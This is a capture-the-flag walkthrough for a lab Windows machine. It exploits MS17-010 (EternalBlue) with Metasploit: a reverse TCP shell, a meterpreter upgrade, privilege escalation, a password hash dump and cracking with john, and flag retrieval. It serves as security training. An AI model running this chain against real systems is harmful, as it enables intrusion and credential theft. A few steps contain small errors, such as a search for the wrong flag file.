# Blue
### Task 1
- Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
  ```
  nmap -sC -sV -A <target_ip>

  Output: -----------------------------------------------------------
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
  ```
- How many ports are open with a port number under 1000?
  > 3
- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
  ```
  nmap --script=vuln -sV -A <target_ip>

  Output: -------------------------------------------------
  | smb-vuln-ms17-010: 
  |   VULNERABLE:
  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2017-0143
  |     Risk factor: HIGH
  |       A critical remote code execution vulnerability exists in Microsoft SMBv1
  |        servers (ms17-010).
  |           
  |     Disclosure date: 2017-03-14
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
  |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
  ```
  > ms17-010
### Task 2
- Start Metasploit: 
  ```
  msfconsole
  ```
- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
  ```
  search ms17_010
  ```
  > exploit/windows/smb/ms17_010_eternalblue
- Show options and set the one required value. What is the name of this value? (All caps for submission)
  ```
  show options
  set rhosts <target ip>
  ```
  > RHOSTS
- Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

  `set payload windows/x64/shell/reverse_tcp`

  With that done, run the exploit!
  ```
  run
  ```
- Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
  ```
  background
  ```
### Task 3
- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
  ```
  Google how to convert a shell to meterpreter shell in metasploit. First result gives the answer.
  ```
  > post/multi/manage/shell_to_meterpreter
- Select this (use MODULE_PATH). Show options, what option are we required to change?
  ```
  use post/multi/manage/shell_to_meterpreter
  show options
  ```
  > session
- Set the required option, you may need to list all of the sessions to find your target here.
  ```
  set session <num>
  ```
- Run! If this doesn't work, try completing the exploit from the previous task once more.
  ```
  run
  ```
- Once the meterpreter shell conversion completes, select that session for use.
  ```
  sessions <num>
  ```
- Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
  ```
  getsystem
  ```
- List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
  ```
  ps
  ```
- Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
  ```
  migrate <PID>
  ```
### Task 4
- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
  ```
  hashdump

  Output: ---------------------------------------------------
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
  ```
  > Jon
- Copy this password hash to a file and research how to crack it. What is the cracked password?
  ```
  echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
  john --format=NT --wordlist=<rockyou.txt> hash.txt
  ```
  > alqfna22
### Task 5
- Flag1? This flag can be found at the system root. 

  There are two ways of accomplishing this. We can return to the shell sessions and `cd` to the **C** directory and `type` out the flag, or we can `search` for it in **meterpreter** and `cat` out the flag.
  ```
  shell:  cd ../..
          type flag1.txt

  meterpreter:  search -f flag1.txt
                cat c:/flag1.txt
  ```
- Flag2? This flag can be found at the location where passwords are stored within Windows.
  ```
  shell:  dir /b/s flag2.txt
          type C:\Windows\System32\config\flag2.txt

  meterpreter:  search -f flag2.txt
                cat c:/Windows/System32/config/flag2.txt
  ```
  >
- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
  ```
  shell:  dir /b/s flag3.txt
          type c:\Users\Jon\Documents\flag3.txt

  meterpreter:  search -f flag2.txt
                cat c:/Users/Jon/Documents/flag3.txt
  ```